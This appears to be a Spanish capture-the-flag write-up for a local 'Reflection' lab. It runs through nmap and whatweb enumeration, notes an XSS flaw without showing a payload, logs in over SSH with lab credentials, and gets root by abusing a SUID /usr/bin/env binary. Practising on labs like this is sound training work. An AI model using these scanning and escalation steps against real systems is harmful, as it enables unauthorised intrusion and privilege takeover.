- Tags: #Reflection
---
[Maquina Reflection](https://mega.nz/file/SAtzAKLL#3ITizYrmaj4-aP1AyjuzHGMoZuSGeiO8lcfIMBOzaqk) -> Enlace de descarga al laboratorio

```bash
7z x reflection.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh reflection.tar # Desplegamos el laboratorio
```
### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectivida con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Usamos nuestra herramienta
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos descubrimiento de puertos.
extractPorts allPorts # Parseamos la informaciion mas relevante del primer escaneo
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar la version y el servicio que corren detras de estos puerots.
```

**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) )** -> Tenemos un servicio ssh expuesto
**( 80/tcp open  http    Apache httpd 2.4.62 ((Debian)) )** -> Tenemos un servicio web expuesto

### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2 # Enumeramos las tecnologias de este servicio.
```

**( http://172.17.0.2 )** -> Direccion ip del servicio desplegado.

### Fase Deteccion XSS:
**Nota** -> La web es vulnerable a **( XSS Reflejado y Almacenado )**

### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh balu@172.17.0.2 # Passoword: ( balulero )  
```

### Fase Escalda Privilegios:
```bash
find / -perm -4000 2>/dev/null # Tenemos un binario potencial para escalar privilegios.
/usr/bin/env
```

```bash
/usr/bin/env /bin/bash -p # Logramos elevar privilegios.
```